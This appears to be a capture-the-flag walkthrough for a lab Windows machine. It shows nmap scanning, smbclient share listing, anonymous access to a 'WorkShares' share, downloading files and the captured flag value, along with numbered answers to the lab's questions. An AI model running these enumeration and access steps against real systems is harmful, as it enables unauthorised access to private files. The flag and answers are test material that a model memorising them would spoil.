1. # Target Info
Target Machine IP = 10.129.23.206

# Solution
1. Server Message Block
2. 445
3. run nmap scan, microsoft-ds
```
○ sudo nmap 10.129.51.2 -sV
[sudo] password for zeta:
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-21 11:39 WIB
Nmap scan report for 10.129.51.2
Host is up (1.8s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.01 seconds
```
4. -L
5. 4
6. run smbclient, WorkShares
```
○ smbclient -L 10.129.51.2
Password for [WORKGROUP\zeta]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk
SMB1 disabled -- no workgroup available
```
7. get
8. get root flag using smbclient
```
○ smbclient \\\\10.129.51.2\\WorkShares
Password for [WORKGROUP\zeta]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 15:22:01 2021
  ..                                  D        0  Mon Mar 29 15:22:01 2021
  Amy.J                               D        0  Mon Mar 29 16:08:24 2021
  James.P                             D        0  Thu Jun  3 15:38:03 2021

		5114111 blocks of size 4096. 1748965 blocks available
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 16:08:24 2021
  ..                                  D        0  Mon Mar 29 16:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 18:00:37 2021
cat wor
		5114111 blocks of size 4096. 1748965 blocks available
smb: \Amy.J\> cat worknotes.txt
cat: command not found
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
smb: \Amy.J\> cd ../
../Amy.J\    ../James.P\
smb: \Amy.J\> cd ../
smb: \> ls
  .                                   D        0  Mon Mar 29 15:22:01 2021
  ..                                  D        0  Mon Mar 29 15:22:01 2021
  Amy.J                               D        0  Mon Mar 29 16:08:24 2021
  James.P                             D        0  Thu Jun  3 15:38:03 2021
cd James.P

		5114111 blocks of size 4096. 1748949 blocks available
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 15:38:03 2021
  ..                                  D        0  Thu Jun  3 15:38:03 2021
  flag.txt                            A       32  Mon Mar 29 16:26:57 2021
cat flag
		5114111 blocks of size 4096. 1748949 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
smb: \James.P\> exit
```
print the files
```
zeta at melforger in ~
○ cat worknotes.txt
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing %                                                                                                        
zeta at melforger in ~
○ cat flag.txt
5f61c10dffbc77a704d76016a22f1664%   
```

flag = 5f61c10dffbc77a704d76016a22f1664%
